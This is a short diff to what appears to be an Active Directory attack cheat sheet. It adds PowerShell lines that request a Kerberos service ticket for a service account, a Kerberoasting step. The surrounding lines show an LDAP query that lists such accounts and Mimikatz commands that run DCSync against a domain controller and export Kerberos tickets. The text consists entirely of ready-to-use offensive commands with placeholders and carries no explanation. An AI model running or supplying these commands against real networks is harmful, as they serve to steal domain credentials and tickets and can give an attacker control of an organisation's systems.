@@ -27,6 +27,11 @@ $a="(&(objectclass=user)(objectcategory=user)(servicePrincipalName=*))";$b=New-O
 
 ****************************************************************************************************************************************
 
+Add-Type -AssemblyName System.IdentityModel
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"
+
+****************************************************************************************************************************************
+
 lsadump::dcsync /domain:<Fully Qualified Domain Name> /user:<ADMIN Username>
 
 sekurlsa::tickets /export
